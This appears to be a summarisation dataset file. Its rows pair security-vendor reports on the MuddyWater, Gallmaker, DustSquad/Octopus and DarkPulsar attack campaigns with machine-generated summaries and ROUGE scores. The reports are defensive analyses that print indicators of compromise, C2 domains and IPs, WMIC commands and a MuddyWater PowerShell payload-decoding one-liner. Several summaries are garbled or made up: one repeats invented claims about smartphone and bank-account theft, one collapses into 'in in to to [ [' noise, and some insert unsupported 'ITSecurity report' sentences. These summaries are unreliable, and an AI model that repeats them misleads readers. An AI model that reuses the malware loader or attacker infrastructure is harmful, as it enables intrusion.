compromiseMD508acd1149b09bf6455c553f512b51085a9ec30226c83ba6d7abb8d2011cdae14E5683fb480353c0dec333a7573710748159238b473f80272fdcd0a8ddf336a9116ac1a2c1e1c3b49e1a3a48fb71cc74f1b086ab28e3d6f73c6605f9ae087ad4a23c82e8c028af5c64cbe37314732ec1924e1bd221ba3813ed7b60561362375872e82e242cb0684b98a8f6f2c0e8a12f337f7e6e5f073508e1ee552ebea5d200e3bb14adb551663fd2328d59f653ba7573c2a0d6d0ecf06f1be9ad411d06f7ba84c5a5c236c9f4480b3d725f297673fad4f873578956d2790101443f24e4bd4d35466c8a099d1d30096775b1f4357d3cf59502e209aedf80e170e653306ca15535a42a712e3b3cfa1db32d9e3d832f8f15bd61a94e7698574eaf82ef2773164635de97ae178888f2dd222bb8a66060ac2665947cf7037a6772687b69279753cdf7a2ff07283ddc69d9f34cfa0d3c936d47beb94f602e97785370fec2d059d54a5801f34abbf90ac2b4fb4b6289830cd16864d6321be50f29e7a7a4bfab746245a8a36d91ca331f62642dbcafc2ea1b1ab9486593e4fb5a4d440093d54a351918794edf251b5fe7cc19488b5f0c3c3e3599c6648cedeb3f5d9f6d104e638bd0c3d9f4044674100a8c28f9ed1b336c337ceaa1e8d0e1c4d4eb9984124df003ea7f2aa564e207926d06b8a59ba50ca2c543dab4f947f4649b9ec28d182b02778aa69ad92ccf85ec170f340457d33bbb81df5b8939fa58fad8aa1ec271f6dae0b7255bb476622bcb0c666e12fbe4ccda8bbefbe62fc5b1576e0a8491519e10bab931dbf310319d6ef95f69a45fc4f2d237ed4c375bbf248592cee1a1999227457c300c73fc71ee35e99230941f03fc32934d9c8b0458c384fd34971875b1c753c9c7ccd371d1d3bd7c8e2110587cfa8b7eaeace2df2907ce543438c19cfaf6c14f699d15aee026074fbd18f780fb51ec0632ad632c8444aab1b43a663401e80c0bac4d6acee43d61cbd4bcd7a5bdf4ed9b343e3e25957b738968befcf2333aa637d97e5683fb480353c0dec333a7573710748eb69fb45feb97af81c2f306564acc2daf00fd318bf58586c29ab970132d1fd2af2b5373f32a4b9b3d34701ff973ba69cf84914c30ae4e6b9b1f23d5c01e001edfaa4469d5cd90623312c86d651f2d930Ffb8ea0347a3af3dd2ab1b4e5a1be18a345b1ea293764df86506f97ba498cc5e029cb7e622f4eb0d058d577c9d322e9206178b5181f30ce00cd55e2690f667ac2b8ab9112e34bb910055d85ec800db3f47ec75d3290add179ac5218d193bb9a8befc203d7fa4c91326791a73e6d6b4daC561e81e30316208925bfddb3cf3360a132efd7b3bdfb591c1bf2a4e19c710ebe7a6c57566d9523daa57fe16f52e377ec0e35c4523a7931f4c99616d6079fd14245fa82c89875b70c2669921d4ba14d3File names%SystemDrive%\ProgramData\EventManager.dll%SystemDrive%\ProgramData\EventManager.logs%SystemDrive%\ProgramData\WindowsDefenderService.ini%SystemDrive%\ProgramData\Defender.sct%SystemDrive%\ProgramData\DefenderService.inf%SystemDrive%\ProgramData\WindowsDefender.ini%SystemDrive%\ProgramData\ZIPSDK\InstallConfNT.vbs%SystemDrive%\ProgramData\ZIPSDK\ProjectConfManagerNT.ini%SystemDrive%\ProgramData\WindowsDefenderTask.ini%SystemDrive%\ProgramData\WindowsDefenderTask.txt%SystemDrive%\ProgramData\WindowsDefenderTask.xml%SystemDrive%\ProgramData\DefenderNT\ConfigRegister.vbs%SystemDrive%\ProgramData\DefenderNT\SetupConf.ini%SystemDrive%\ProgramData\ASDKiMalwareSDK\ProjectConfSDK.vbs%SystemDrive%\ProgramData\ASDKiMalwareSDK\SetupConfSDK.ini%SystemDrive%\ProgramData\FirefoxSDK\ConfigRegisterSDK.ini%SystemDrive%\ProgramData\FirefoxSDK\ConfigRegisterSDK.vbs%SystemDrive%\ProgramData\OneDrive.dll%SystemDrive%\ProgramData\OneDrive.html%SystemDrive%\ProgramData\OneDrive.ini%SystemDrive%\ProgramData\WindowsNT\WindowsNT.ini%SystemDrive%\ProgramData\WindowsNT\WindowsNT.vbs%SystemDrive%\ProgramData\SYSTEM32SDK\ConfManagerNT.vbs%SystemDrive%\ProgramData\SYSTEM32SDK\ProjectConfManagerNT.ini%windir%\System32\Tasks\Microsoft\WindowsDefenderUpdater%windir%\System32\Tasks\Microsoft\MicrosoftOneDrive%windir%\System32\Tasks\Microsoft\WindowsDifenderUpdate%windir%\System32\Tasks\Microsoft\WindowsSystem32SDK%windir%\System32\Tasks\Microsoft\WindowsDefenderSDK%windir%\System32\Tasks\Microsoft\WindowsMalwareDefenderSDK%windir%\System32\Tasks\Microsoft\WindowsMalwareByteSDKDomains, URLs and IP addresseshttp://www.cankayasrc[.]com/style/js/main.phphttp://ektamservis[.]com/includes/main.phphttp://gtme[.]ae/font-awesome/css/main.phphttps://www.adfg[.]ae/wp-includes/widgets/main.phphttp://adibf[.]ae/wp-includes/js/main.phphttp://hubinasia[.]com/wp-includes/widgets/main.phphttps://benangin[.]com/wp-includes/widgets/main.php104.237.233.60104.237.255.212104.237.233.405.9.0.155";"MuddyWater is a relatively new APT that surfaced in 2017. It has focused mainly on governmental targets in Iraq and Saudi Arabia, according to past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US. We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and educational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other victims were also detected in Mali, Austria, Russia, Iran and Bahrain.. These new spearphishing docs have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing.The new spearphishing docs rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers' arsenal but also some OPSEC mistakes made by the attackers.Previous related research:https://sec0wn.blogspot.com/2018/05/clearingmuddywateranalysisofnew.html?m=1https://reaqta.com/2017/11/muddywaterapttargetingmiddleeast/https://blog.malwarebytes.com/threatanalysis/2017/09/elaboratescriptingfuusedinespionageattackagainstsaudiarabiagovernment_entity/https://www.sekoia. The ITSecurity report states that the malware is capable of bypassing allowlisting solutions since it is all from Microsoft and very likely allowlisted. Regardless of the file extensions, the files dropped by the macro are EITHER INF, SCT and text files OR VBS and text files. Case 1: INF, SCT and text files dropped by the macroINF is launched via the advpack.dll ""LaunchINFSection"" function. INF registers the SCT file (scriptlet file) via scrobj.dll (Microsoft Scriptlet library). Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell oneliner which finally consumes the text file.powershell.exe exec Bypass c $s=(getcontent C:\\ProgramData\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c ne $s.length){$v=($v*52)+([Int32][char]$s[$c]40);if((($c+1)%3) eq 0){while($v ne 0){$vv=$v%256;if($vv gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);PowerShell onelinerExecution flow:Case 2: VBS and text files dropped by the macroThe VBS file decodes itself and calls mshta.exe, passing on one line of VBScript code to it, which in turn spawns a PowerShell oneliner which finally consumes the text file (usually Base64encoded text).pow MuddyWater is a type of malware that is designed to steal sensitive data from its victims. The malware is capable of infecting a wide range of devices, including computers, smartphones, and tablets. The malware can also be used to gain access to a victim's online accounts, such as bank accounts, email accounts, and social media accounts. Additionally, the malware can also be used to gain access to a victim's personal information, such as credit card numbers, passwords, and other sensitive data. The malware is capable of infecting a wide range of devices, including computers, smartphones, and tablets. The malware can also be used to gain access to a victim's online accounts, such as bank accounts, email accounts, and social media accounts. Additionally, the malware can also be used to gain access to a victim's personal information, such as credit card numbers, passwords, and other sensitive data. The malware is capable of infecting a wide range of devices, including computers, smartphones, and tablets. The malware can also be used to gain access to a victim's online accounts, such as bank accounts, email accounts, and social media accounts. Additionally, the malware can also be used to gain access to a victim's personal information, such as credit card numbers, passwords, and other sensitive data. The malware is capable of infecting a wide range of devices, including computers, smartphones, and tablets. The malware can also be used to gain access to a victim's online accounts, such as bank accounts, email accounts, and social media accounts. Additionally, the malware can also be used to gain access to a victim's personal information, such as credit card numbers, passwords, and other sensitive data. The malware is capable of infect The malicious decoy documents used in the attacks suggest they are geopolitically motivated, targeting sensitive personnel and organizations. . [. [ in in in in. [...... [. [ in in in in [ to. to [ to to to to. to. to to to to to to to to to to to to to to to to to in to in the in in in in in in in in in in in in [. [.... to [. to [ [ [ [ [ to [ to to to to to to to to to to to to to to to to to to to to to to [ to [ to [ to [ to [ to [ [. [. to to to to to in in in to in to to in in in in in in in in to in in in in in in in in in in in in in in in in in in in in in [. [. [. [.. [.... in in in in to to to to in in in in the in the in the in in in in in in in in in in in in in in in in in in in. to........... in in in in in in in in in in in in in in in in in [. [ to to to of of [ of [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [5 to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to to [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ [ of of of of of of of of [ of [ [ of [ of of of of of of of of of of of of the [ [ [ [ [ [ [ [";en;{'r': 0.24387527839643652, 'p': 0.8051470588235294, 'f': 0.37435897079032804};{'r': 0.17643429981492906, 'p': 0.6875, 'f': 0.28080510229706734};{'r': 0.24276169265033407, 'p': 0.8014705882352942, 'f': 0.37264956908092634}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/gallmaker-attack-group;Gallmaker: New Attack Group Eschews Malware to Live off the Land;The DDE protocol can be used for legitimate purposes to send messages between Microsoft applications that share data through shared memory, e.g. to share data between Excel and Word.However, the DDE protocol was flagged as unsecure last year, when researchers discovered it could be exploited to execute code on victim machines via Excel and Word, without macros being enabled in those applications. Microsoft said at the time that this capability was a feature and the company did not consider it a vulnerability because Office always warned users before enabling DDE in documents, as seen in Figure 1. However, after the DDE protocol was subsequently exploited in a number of malware campaigns, Microsoft issued an update to Office in December 2017 that disabled DDE by default in Word and Excel. DDE can be enabled manually after this update is applied but only if the registry is altered by an admin account.The Gallmaker victims we have seen did not have this patch installed and therefore were still vulnerable to exploit via the DDE protocol.Targets and timelineGallmaker's activity appears to be highly targeted, with its victims all related to government, military, or defense sectors. Several targets are embassies of an Eastern European country. The targeted embassies are located in a number of different regions globally, but all have the same home country.The other targets we have seen are a Middle Eastern defense contractor and a military organization. There are no obvious links between the Eastern European and Middle Eastern targets, but it is clear that Gallmaker is specifically targeting the defense, military, and government sectors: its targets appear unlikely to be random or accidental.Gallmaker's activity has been quite consistent since we started tracking it. The group has carried out attacks most months since December 2017. Its activity subsequently increased in the second quarter of 2018, with a particular spike in April 2018.;The DDE protocol can be used for legitimate purposes to send messages between Microsoft applications that share data through shared memory, e.g. to share data between Excel and Word. However, the DDE protocol was flagged as unsecure last year, when researchers discovered it could be exploited to execute code on victim machines via Excel and Word, without macros being enabled in those applications. Microsoft said at the time that this capability was a feature and the company did not consider it a vulnerability because Office always warned users before enabling DDE in documents, as seen in Figure 1. However, after the DDE protocol was subsequently exploited in a number of malware campaigns, Microsoft issued an update to Office in December 2017 that disabled DDE by default in Word and Excel. DDE can be enabled manually after this update is applied but only if the registry is altered by an admin account. The Gallmaker victims we have seen did not have this patch installed and therefore were still vulnerable to exploit via the DDE protocol. Targets and timeline Gallmaker's activity appears to be highly targeted, with its victims all related to government, military, or defense sectors. Several targets are embassies of an Eastern European country. The targeted embassies are located in a number of different regions globally, but all have the same home country. The other targets we have seen are a Middle Eastern defense contractor and a military organization. There are no obvious links between the Eastern European and Middle Eastern targets, but it is clear that Gallmaker is specifically targeting the defense, military, and government sectors: its targets appear unlikely to be random or accidental. Gallmaker's activity has been quite consistent since we started tracking it. The group has carried out attacks most months since December 2017. Its activity subsequently increased in the second quarter of 2018,;en;{'r': 0.9726775956284153, 'p': 0.994413407821229, 'f': 0.9834254093652514};{'r': 0.9693877551020408, 'p': 0.9930313588850174, 'f': 0.9810671206461646};{'r': 0.9726775956284153, 'p': 0.994413407821229, 'f': 0.9834254093652514}
https://securelist.com/octopus-infested-seas-of-central-asia/88200/;Octopus-infested seas of Central Asia;"For the last two years we have been monitoring a Russian-language cyberespionage actor that focuses on Central Asian users and diplomatic entities. We named the actor DustSquad and have provided private intelligence reports to our customers on four of their campaigns involving custom Android and Windows malware. In this blogpost we cover a malicious program for Windows called Octopus that mostly targets diplomatic entities.The name was originally coined by ESET in 2017 after the 0ct0pus3.php script used by the actor on their old C2 servers. We also started monitoring the malware and, using Kaspersky Attribution Engine based on similarity algorithms, discovered that Octopus is related to DustSquad, something we reported in April 2018. In our telemetry we tracked this campaign back to 2014 in the former Soviet republics of Central Asia (still mostly Russian-speaking), plus Afghanistan.In the case of Octopus, DustSquad used Delphi as their programming language of choice, which is unusual for such an actor. Among others exceptions are the Russian-language Zebrocy (Sofacy's Delphi malware), the Hindi-language DroppingElephant and the Turkish-language StrongPity. Although we detected Octopus victims that were also infected with Zebrocy/Sofacy, we didn't find any strong similarities and we don't consider the two actors to be related.What happened?In April 2018 we discovered a new Octopus sample pretending to be Telegram Messenger with a Russian interface. We couldn't find any legitimate software that this malware appears to be impersonating, in fact, we don't believe it exists. The Trojan uses third-party Delphi libraries like The Indy Project for JSON-based C2 communications and TurboPower Abbrevia (sourceforge.net/projects/tpabbrevia) for compression. Malware persistence is basic and achieved via the system registry. The server side uses commercial hosting in different countries with .php scripts deployed. Kaspersky Lab products detect the Octopus Trojan as Trojan.Win32.Octopus.gen. For more information, please contact: intelreports@kaspersky.com.Technical detailsThe attackers used the potential Telegram ban in Kazakhstan to push its dropper as an alternative communication software for the political opposition.We can't confirm how this malware is being distributed, although it clearly uses some form of social engineering. This actor previously used spear phishing to spread malware.DropperMD5 hash 979eff03faeaeea5310df53ee1a2fc8e Name dvkmailer.zipArchive contentsd6e813a393f40c7375052a15e940bc67 CsvHelper.dll Legit .NET CSV files parser 664a15bdc747c560c11aa0cf1a7bf06e Telegram Messenger.exe Persistence and launcher 87126c8489baa8096c6f30456f5bef5e TelegramApi.dll Network module d41d8cd98f00b204e9800998ecf8427e Settings.json EmptyLauncherMD5 hash 664a15bdc747c560c11aa0cf1a7bf06e File name Telegram Messenger.exe PE timestamp 2018.03.18 21:34:12 (GMT) Linker version 2.25 (Embarcadero Delphi)Before any user interaction, inside the FormCreate() function the launcher checks for a file named TelegramApi.dll in the same directory. If it exists, the launcher copies the network module to the startup directory as Java.exe and runs it.Delphi Visual Component Library (VCL) programs are based on event handlers for form elements. Such programs are extremely large (about 2.6 MB and 12,000 functions), but all this code is mostly used to handle the visual components and run-time libraries. There are only three programmer-defined handlers for controlling elements inside the Octopus launcher.Function name Functionality FormCreate() Runs as constructor before any user activity. Makes the network module persistent via Startup directory and runs it Button1Click() Shows the explorer dialog window to choose the ""mailing file"" DateTimePicker1Click() Shows calendar to select the ""mailing date""There is no handler for the 'Send mailing' button, so the launcher pretends to be an alternative communicator that in reality does nothing. This may be because the malware is still unfinished - after all, messages sent through it could be of value to the attackers. However, we believe it is more likely that the malware was created in a hurry and the attackers decided to skip any communication features.Network moduleMD5 hash 87126c8489baa8096c6f30456f5bef5e File name TelegramApi.dll PE timestamp 2018.02.06 11:09:28 (GMT) Linker version 2.25 (Embarcadero Delphi)Despite the file extension, this network module is a self-sufficient portable executable file and not a dynamic-link library. The first sample checks for files with names like 1?????????.* in the user's temporary folder and deletes any files it finds. Then it creates .profiles.ini in the Application Data directory where the malware stores its log.HTTP request Response GET /d.php?check JSON ""ok"" GET /d.php?servers JSON domain name GET /i.php?check= JSON ""ok"" POST /i.php?query= JSON response code or command depends on POST dataAll network modules consist of hardcoded IP addresses belonging to commercial web-hosting services based in different countries. The operators simply deploy their first-stage .php script in them, which will check the connection and get the actual C2 server domain name using an HTTP GET request.The network module checks against a 32-digit hardcoded victim id and sends the gathered data to the C2 using a HTTP POST request. In terms of programming, this id is strange, because the malware simultaneously 'fingerprints' its victim with an MD5 hash of its system data.All communication with the C2s is based on JSON-formatted data and the HTTP protocol. For that, the developers used The Indy Project (indyproject.org) publicly available library as well as the third-party TurboPower Abbrevia (sourceforge.net/projects/tpabbrevia) for compression.After all the initial HTTP GET requests, the malware starts to gather JSON-formatted system data. For all the fixed drives in the system, the network module stores the disk name and size, as well as computer and user name, Windows directory, host IP, etc. One interesting field is ""vr"":""2.0? which appears to be the malware version encoded in the communication protocol.The 'id' field is the victim's fingerprint for which the malware actively uses the Windows Management Instrumentation mechanism. The Trojan runs WMIC.exe with the following arguments:C:\WINDOWS\system32\wbem\WMIC.exe computersystem get Name /format:list C:\WINDOWS\system32\wbem\WMIC.exe os get installdate /format:list C:\WINDOWS\system32\wbem\WMIC.exe path CIM_LogicalDiskBasedOnPartition get Antecedent,DependentThen the module concatenates the gathered ids and computes an MD5 hash, which will be the victim's final id. The ""act"" field numbers the communication stage (0 for initial fingerprinting). After this, the HTTP POST control server returns a JSON {""rt"":""30?} and the client continues with the next ""act"" in the HTTP POST:At this point the C2 sends a JSON with commands to execute, including uploading/downloading files, taking a screenshot and finding *.rar archives on the host.Other softwareBesides the Trojan itself, the Octopus developers used the password dumping utility fgdump.InfrastructureMD5 hash IPs C2 domain 87126c8489baa8096c6f30456f5bef5e 185.106.120.27204.145.94.10 porenticofacts.com ee3c829e7c773b4f94b700902ea3223c 38f30749a87dcbf156689300737a094e 185.106.120.240204.145.94.101 certificatesshop.com 6e85996c021d55328322ce8e93b31088 5.188.231.101103.208.86.238 blondehairman.com 7c0050a3e7aa3172392dcbab3bb92566 5.8.88.87103.208.86.237 latecafe.in 2bf2f63c927616527a693edf31ecebea 85.93.31.141104.223.20.136 hovnanflovers.com d9ad277eb23b6268465edb3f68b12cb2 5.188.231.101103.208.86.238 blondehairman.comThe most recent samples (2017-2018) of hardcoded IPs and web domains obtained from the .php scriptConclusionsPolitical entities in Central Asia have been targeted throughout 2018 by different actors, including IndigoZebra, Sofacy (with Zebrocy malware) and most recently by DustSquad (with Octopus malware). Interestingly, we observed some victims who are 'threat magnets' targeted by all of them. From our experience we can say that the interest shown by threat actors in this region is now high, and the traditional 'players' have been joined by relative newcomers like DustSquad that have sprung up locally.Indicators of compromiseFile hashes87126c8489baa8096c6f30456f5bef5eee3c829e7c773b4f94b700902ea3223c38f30749a87dcbf156689300737a094e6e85996c021d55328322ce8e93b310887c0050a3e7aa3172392dcbab3bb925662bf2f63c927616527a693edf31ecebead9ad277eb23b6268465edb3f68b12cb2Domains and IPs85.93.31.141104.223.20.1365.8.88.87103.208.86.237185.106.120.240204.145.94.1015.188.231.101103.208.86.238185.106.120.27204.145.94.10hovnanflovers.comlatecafe.incertificatesshop.comblondehairman.comporenticofacts.comAuxiliary URLs to upload/download files:www.fayloobmennik.net/files/save_new.htmlhttp://uploadsforyou.com/download/http://uploadsforyou.com/remove/The following are old indicators of compromise no longer used by this actor, but which can be used for forensic purposes:031e4900715564a21d0217c22609d73f1610cddb80d1be5d711feb46610f8a771ce9548eae045433a0c943a07bb0570a3a54b3f9e9bd54b4098fe592d805bf72546ab9cdac9a812aab3e785b749c89b25cbbdce774a737618b8aa852ae754251688854008f567e65138c3c34fb2562d06fda541befa1ca675d9a0cc310c4906173d5d104b34fc14d32c04b30ce4de4ae88ad67294cf53d521f8295aa1a7b5c46a90caeb6645b6c866ef60eb2d5f2d0c5ae4e901509b05022bbe7ef340f4ad96cca743d10d27277584834e72afefd6be8ce45e69eac5c55419f2c30d9a8c9104bdf392cd03909ad5cd7dcea83ee6d66a0e149c1da1e05774e6b168b6b00272eb4f625ba7f9d7577db561d4a39a6bb134afc8b5b2f0b1132527a2bcb5985c2fe6bf7b1503a48a46e3269e6c6b537b033f84f4a8898b0aa4507dbb568dca1dedd38First stage .php script placed at:148.251.185.168185.106.120.46185.106.120.4746.249.52.2445.255.71.845.255.71.8588.198.204.19692.63.88.142Domains returned by .php script:giftfromspace.commikohanzer.websitehumorpics.downloaddesperados20.esprom3.biz.ua";DustSquad is a Russianspeaking cyberespionage actor that has been targeting Central Asian users and diplomatic entities for the last two years. DustSquad uses custom Android and Windows malware, named Octopus, to target diplomatic entities. The malware pretends to be Telegram Messenger with a Russian interface and uses thirdparty Delphi libraries like The Indy Project for JSONbased C2 communications and TurboPower Abbrevia (sourceforge.net/projects/tpabbrevia) for compression. Malware persistence is basic and achieved via the system registry. The server side uses commercial hosting in different countries with .php scripts deployed. Kaspersky Lab products detect the Octopus Trojan as Trojan.Win32.Octopus.gen. The ITSecurity report states that the attackers used the potential Telegram ban in Kazakhstan to push its dropper as an alternative communication software for the political opposition. ### Output: The ITSecurity report states that the attackers used the potential Telegram ban in Kazakhstan to push its dropper as an alternative communication software for the political opposition.;en;{'r': 0.13010590015128592, 'p': 0.8775510204081632, 'f': 0.22661396349548069};{'r': 0.08117443868739206, 'p': 0.7401574803149606, 'f': 0.1463035001642296};{'r': 0.12556732223903178, 'p': 0.8469387755102041, 'f': 0.21870882515555976}
https://securelist.com/darkpulsar/88199/;DarkPulsar;"In March 2017, the ShadowBrokers published a chunk of stolen data that included two frameworks: DanderSpritz and FuzzBunch.DanderSpritz consists entirely of plugins to gather intelligence, use exploits and examine already controlled machines. It is written in Java and provides a graphical windows interface similar to botnets administrative panels as well as a Metasploit-like console interface. It also includes its own backdoors and plugins for not-FuzzBunch-controlled victims.Fuzzbunch on the other hand provides a framework for different utilities to interact and work together. It contains various types of plugins designed to analyze victims, exploit vulnerabilities, schedule tasks, etc. There are three files in the plugin set from the FuzzBunch framework:%pluginName%-version.fbThis is the utility file of the framework. It duplicates the header from XML and includes the plugin's ID.%pluginName%-version.exeThis executable file is launched when FuZZbuNch receives the command to do so.%pluginName%-version.xmlThis configuration file describes the plugin's input and output parameters - the parameter name, its type and description of what it's responsible for, all of these can be shown in FuzzBunch as a prompt. This file also contributes a lot to the framework's usability, as it supports the specification of default parameters.One of the most interesting Fuzzbunch's categories is called ImplantConfig and includes plugins designed to control the infected machines via an implant at the post-exploitation stage. DarkPulsar is a very interesting administrative module for controlling a passive backdoor named 'sipauth32.tsp' that provides remote control, belonging to this category.It supports the following commands:BurnRawShellcodeEDFStagedUploadDisableSecurityEnableSecurityUpgradeImplantPingPongBurn, RawShellcode, UpgradeImplant, and PingPong remove the implant, run arbitrary code, upgrade the implant and check if the backdoor is installed on a remote machine, respectively. The purpose of the other commands is not that obvious and, to make it worse, the leaked framework contained only the administrative module to work with DarkPulsar's backdoor, but not the backdoor itself.While analyzing the administrative module, we noticed several constants that are used to encrypt the traffic between the C&C and the implant:We thought that probably these constants should also appear in the backdoor, so we created a detection for them. Several months later we found our mysterious DarkPulsar backdoor. We later were able to find both 32- and 64-bit versions.We found around 50 victims located in Russia, Iran and Egypt, typically infecting Windows 2003/2008 Server. Targets were related to nuclear energy, telecommunications, IT, aerospace and R&D.DarkPulsar technical highlightsThe DarkPulsar implant is a dynamic library whose payload is implemented in exported functions. These functions can be grouped as follows:Two nameless functions used to install the backdoor in the system. Functions with names related to TSPI (Telephony Service Provider Interface) operations that ensure the backdoor is in the autorun list and launched automatically. A function with a name related to SSPI (Security Support Provider Interface) operations. It implements the main malicious payload.The implementations of the SSPI and TSPI interfaces are minimalistic: the functions that are exported by DarkPulsar have the same names as the interface functions, however, they include malicious code instead of the phone service.The implant is installed in the system by the nameless exported function. The backdoor is launched by calling Secur32.AddSecurityPackage with administrator privileges with the path to its own library in the parameter, causing lsass.exe to load DarkPulsar as SSP/AP and to call its exported function SpLsaModeInitialize used by DarkPulsar to initialize the backdoor. In this way AddSecurityPackage is used to inject code into lsass.exe. It also adds its library name at HKLM\Software\Microsoft\Windows\CurrentVersion\Telephony\ProvidersThis is loaded at start by the Telephony API (TapiSrv) launched alongside the Remote Access Connection Manager (RasMan) service, setting startup type as ""Automatic"". When loading the telephony service provider's library, TapiSrv calls TSPI_lineNegotiateTSPIVersion which contains the AddSecurityPackage call to make the inject into lsass.exe.DarkPulsar implements its payload by installing hooks for the SpAcceptLsaModeContext - function responsible for authentication. Such injects are made in several system authentication packets within the process lsass.exe and allow Darkpulsar to control authentication process based on the following protocols:Msv1_0.dll - for the NTLM protocol,Kerberos.dll - for the Kerberos protocol,Schannel.dll - for the TLS/SSL protocols,Wdigest.dll - for the Digest protocol, andLsasrv.dll -for the Negotiate protocol.After this, Darkpulsar gets ability to embed malware traffic into system protocols. Since this network activity takes place according to standard system charts, it will only be reflected in the System process - it uses the system ports reserved for the above protocols without hindering their normal operation.The second advantage of controlling authentication processes is ability to bypass entering a valid username and password for obtaining access to objects that require authentication such as processes list, remote registry, file system through SMB. After Darkpulsar's DisableSecurity command is sent, backdoor's hooks on the victim side will always returns in the SpAcceptLsaModeContext function that passed credentials are valid. Getting that, system will provide access to protected objects to client.Working with DarkPulsarDarkpulsar-1.1.0.exe is the administrative interface working under the principle of ""one command - one launch"". The command to be executed must be specified either in the configuration file Darkpulsar-1.1.0.9.xml or as command line arguments, detailing at least:whether the target machine uses a 32-bit or 64-bit system,protocol (SMB, NBT, SSL, RDP protocols are supported) to deliver the command and port numberprivate RSA key to decrypt the session AES keyDarkpulsar-1.1.0 was not designed as a standalone program for managing infected machines. This utility is a plugin of the Fuzzbunch framework that can manage parameters and coordinate different components. Here is how DisableSecurity command in Fuzzbunch looks like:Below is an example of Processlist after DisableSecurity, allowing to execute any plugin without valid credentials and operating via regular system functions (remote registry service):DanderSpritzDanderSpritz is the framework for controlling infected machines, different from FuZZbuNch as the latter provides a limited toolkit for the post-exploitation stage with specific functions such as DisableSecurity and EnableSecurity for DarkPulsar.For DanderSpritz works for a larger range of backdoors, using PeedleCheap in the victim to enable operators launching plugins. PeddleCheap is a plugin of DanderSpritz which can be used to configure implants and connect to infected machines. Once a connection is established all DanderSpritz post-exploitation features become available.This is how DarkPulsar in EDFStagedUpload mode provides the opportunity to infect the victim with a more functional implant: PCDllLauncher (Fuzzbunch's plugin) deploys the PeddleCheap implant on the victim side, and DanderSpritz provides a user-friendly post-exploitation interface. Hence, the full name of PCDllLauncher is 'PeddleCheap DLL Launcher'.The complete DanderSpritz usage scheme with the plugin PeddleCheap via FuZZbuNch with the plugins DarkPulsar and PCDllLauncher consists of four steps:Via FuZZbuNch, run command EDFStagedUpload to launch DarkPulsar.In DanderSpritz, run command pc_prep (PeedelCheap Preparation) to prepare the payload and the library to be launched on the implant side.In DanderSpritz, run command pc_old (which is the alias of command pc_listen -reuse -nolisten -key Default) - this sets it to wait for a socket from Pcdlllauncher.Launch Pcdlllauncher via FuZZbuNch and specify the path to the payload that has been prepared with the command pc_prep in the ImplantFilename parameter./ol>ConclusionsThe FuzzBunch and DanderSpritz frameworks are designed to be flexible and to extend functionality and compatibility with other tools. Each of them consists of a set of plugins designed for different tasks: while FuzzBunch plugins are responsible for reconnaissance and attacking a victim, plugins in the DanderSpritz framework are developed for managing already infected victims.The discovery of the DarkPulsar backdoor helped in understanding its role as a bridge between the two leaked frameworks, and how they are part of the same attacking platform designed for long-term compromise, based on DarkPulsar's advanced abilities for persistence and stealthiness. The implementation of these capabilities, such as encapsulating its traffic into legitimate protocols and bypassing entering credentials to pass authentication, are highly professional.Our product can completely remove the related to this attack malware.Detecting malicious network activityWhen EDFStagedUpload is executed in an infected machine, a permanent connection is established, which is why traffic via port 445 appears. A pair of bound sockets also appears in lsass.exe:When DanderSpritz deploys PeddleCheap's payload via the PcDllLauncher plugin, network activity increases dramatically:When a connection to the infected machine is terminated, network activity ceases, and only traces of the two bound sockets in lsass.exe remain:IOCsimplant - 96f10cfa6ba24c9ecd08aa6d37993fe4File path - %SystemRoot%\System32\sipauth32.tspRegistry - HKLM\Software\Microsoft\Windows\CurrentVersion\Telephony\Providers";"The ShadowBrokers published a chunk of stolen data that included two frameworks: DanderSpritz and FuzzBunch. DanderSpritz consists entirely of plugins to gather intelligence, use exploits and examine already controlled machines. It is written in Java and provides a graphical windows interface similar to botnets administrative panels as well as a Metasploitlike console interface. It also includes its own backdoors and plugins for notFuzzBunchcontrolled victims. FuzzBunch on the other hand provides a framework for different utilities to interact and work together. It contains various types of plugins designed to analyze victims, exploit vulnerabilities, schedule tasks, etc. There are three files in the plugin set from the FuzzBunch framework: %pluginName%version.fb This is the utility file of the framework. It duplicates the header from XML and includes the plugin's ID. %pluginName%version.exe This executable file is launched when FuZZbuNch receives the command to do so. %pluginName%version.xml This configuration file describes the plugin's input and output parameters the parameter name, its type and description of what it's responsible for; all of these can be shown in FuzzBunch as a prompt. This file also contributes a lot to the framework's usability, as it supports the specification of default parameters. One of the most interesting Fuzzbunch's categories is called ImplantConfig and includes plugins designed to control the infected machines via an implant at the postexploitation stage. DarkPulsar is a very interesting administrative module for controlling a passive backdoor named 'sipauth32.tsp' that provides remote control, belonging to this category. It supports the following commands: BurnRawShellcode, EDFStagedUpload, DisableSecurity,";en;{'r': 0.24203821656050956, 'p': 0.9382716049382716, 'f': 0.3848101233220318};{'r': 0.1760851760851761, 'p': 0.8847736625514403, 'f': 0.2937158442258746};{'r': 0.24044585987261147, 'p': 0.9320987654320988, 'f': 0.3822784777524115}
